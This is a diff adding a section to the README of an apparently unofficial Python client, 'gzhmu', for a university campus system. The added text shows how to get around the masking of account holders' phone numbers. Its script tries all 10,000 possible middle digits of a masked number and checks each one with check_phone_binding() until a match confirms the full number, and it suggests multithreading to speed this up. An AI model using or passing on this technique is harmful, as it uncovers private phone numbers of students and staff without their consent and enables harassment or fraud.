@@ -51,6 +51,53 @@ except UsernameNotExistsException:
 
 当使用非校园网内网访问时需要使用Web VPN，即使用get_contact()方法要指定webvpn参数为**True**。使用校园网访问时则无须显式指定，因为webvpn参数默认为**False**。
 
+柳暗花明：虽然此方法已无法直接获取完整手机号码，但借助check_phone_binding()方法仍能间接得到完整的手机号码，详见下面2个示例。
+
+- 判断一个手机号码是否绑定到某个账号，或者说数据库中是否存在这个手机号码
+
+注意：此方法仅能判断数据库中是否存在某个手机号，而无法获取与之绑定的账号。
+
+```python
+from gzhmu import *
+phone = 'xxxxxxxxxxx'  # 11位号码
+result = Gzhmu.check_phone_binding(phone)
+print('手机号码', phone, '存在' if result else '不存在')
+```
+
+- 使用get_contact()和check_phone_binding()方法获取指定账号的完整手机号码
+
+思路：get_contact()获取到的是形如123\*\*\*\*4567的中间4位未知的号码，那么共有10000种可能的号码组合，只需要遍历这些可能的号码，用check_phone_binding()方法逐一判断号码是否存在，就能得到完整的手机号码。需要注意的是，如果其他账号下绑定的手机号码碰巧也是123\*\*\*\*4567的形式，最终就可能得到多个匹配的号码，需要加以甄别。
+
+```python
+from gzhmu import *
+account = 'xxxxxxxxxx'
+try:
+    contact = Gzhmu.get_contact(account)
+    if contact.phone is None:
+        print('账号', account, '未绑定手机号')
+    else:
+        print('不完整号码:', contact.phone)
+
+        phone = contact.phone
+        possible_phone = []
+        for i in range(10000):
+            complete_phone = f'{phone[:3]}{i:04}{phone[-4:]}'
+            result = Gzhmu.check_phone_binding(complete_phone)
+            if result:
+                possible_phone.append(complete_phone)
+                print(complete_phone, '匹配')
+            else:
+                print(complete_phone)
+
+        print('共发现', len(possible_phone), '个可能的号码：')
+        for phone in possible_phone:
+            print(phone)
+except UsernameNotExistsException:
+    print('账号不存在')
+```
+
+单线程遍历一次大概耗时十几分钟，如果使用多线程应该可以缩短到几分钟。
+
 - 在内网获取学籍卡片
 
 ```python
